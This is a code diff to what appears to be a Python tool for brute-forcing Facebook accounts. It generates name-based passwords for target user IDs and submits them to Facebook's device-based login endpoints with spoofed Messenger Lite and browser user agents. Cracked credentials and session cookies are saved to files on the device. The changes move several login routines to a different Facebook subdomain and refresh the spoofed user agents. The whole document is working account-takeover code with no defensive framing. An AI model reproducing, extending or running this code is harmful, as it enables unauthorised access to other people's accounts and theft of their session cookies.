@@ -28,8 +28,11 @@ ani=('Fariya')
 love=('mbasic')
 ugen=[]
 ugen=[]
-header_grup =  'Davik/2.1.0 (Linux; U; Android 7.1.1; SM-J250F Build/NMF26X) [FBAN/MessengerLite;FBAV/360.0.0.7.53;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/444811002;FBCR/;FBMF/Samsung;FBBD/Samsung;FBDV/M2012K11C;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]'
-header_grup =  'Davik/2.1.0 (Linux; U; Android 13; 2201122G Build/TKQ1.220807.001) [FBAN/MessengerLite;FBAV/417.0.0.33.65;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/444811002;FBCR/;FBMF/Redmi;FBBD/Xiaomi;FBDV/M2012K11C;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]'
+header_grup = 'Davik/2.1.0 (Linux; U; Android 13; 23049RAD8C Build/TKQ1.221114.001) [FBAN/MessengerLite;FBAV/429.0.0.27.114;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/291009976;FBCR/;FBMF/Xiaomi;FBBD/Redmi;FBDV/23049RAD8C;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]'
+header_grup =  'Davik/2.1.0 (Linux; U; Android 7.1.1; SM-J250F Build/NMF26X) [FBAN/MessengerLite;FBAV/429.0.0.27.114;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/444811002;FBCR/;FBMF/Samsung;FBBD/Samsung;FBDV/M2012K11C;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]'
+header_grup =  'Davik/2.1.0 (Linux; U; Android 13; 2201122G Build/TKQ1.220807.001) [FBAN/MessengerLite;FBAV/429.0.0.27.114;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/444811002;FBCR/;FBMF/Redmi;FBBD/Xiaomi;FBDV/M2012K11C;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]'
+header_grup =  'Davik/2.1.0 (Linux; U; Android 13; SM-S134DL Build/TP1A.220) [FBAN/MessengerLite;FBAV/429.0.0.27.114;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/444811002;FBCR/;FBMF/Samsung;FBBD/Samsung;FBDV/23049RAD8C;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]'
+header_grup =  'Davik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/MessengerLite;FBAV/429.0.0.27.114;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/444811002;FBCR/;FBMF/vivo;FBBD/vivo;FBDV/vivo;FBSV/5.1.1;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]'
 for xd in range(10000):
         aa='Mozilla/5.0 (Linux; Android 13; SM-G980F Build/TP1A.220624.014; wv)'
         b=random.choice(['6','7','8','9','10','11','12',])
@@ -223,10 +226,10 @@ def m1(ids,names,passlist):
                 for fikr in passlist:
                	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         SH4N7O=session.cookies.get_dict().keys()
                         if "c_user" in SH4N7O:
                                 coki=session.cookies.get_dict()
@@ -240,7 +243,6 @@ def m1(ids,names,passlist):
                         elif 'checkpoint' in SH4N7O:
                                 if 'y' in pcp:
                                         print(f'\r\r\x1b[38;5;208m [SH4N7O•CP] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/SH4N7O_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                                         open(f'/sdcard/SH4N7O•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
@@ -268,9 +270,9 @@ def m3(ids,names,passlist):
                	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                         ua=random.choice(ugen)
                         head = {'Host': 'm.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         SH4N7O=session.cookies.get_dict().keys()
                         if "c_user" in SH4N7O:
                                 coki=session.cookies.get_dict()
@@ -311,9 +313,9 @@ def m2(ids,names,passlist):
                	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                         ua=random.choice(ugen)
                         head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         SH4N7O=session.cookies.get_dict().keys()
                         if "c_user" in SH4N7O:
                                 coki=session.cookies.get_dict()
@@ -354,9 +356,9 @@ def m4(ids,names,passlist):
                	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                         ua=random.choice(ugen)
                         head = {'Host': 'x.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         SH4N7O=session.cookies.get_dict().keys()
                         if "datr" in SH4N7O:
                                 coki=session.cookies.get_dict()
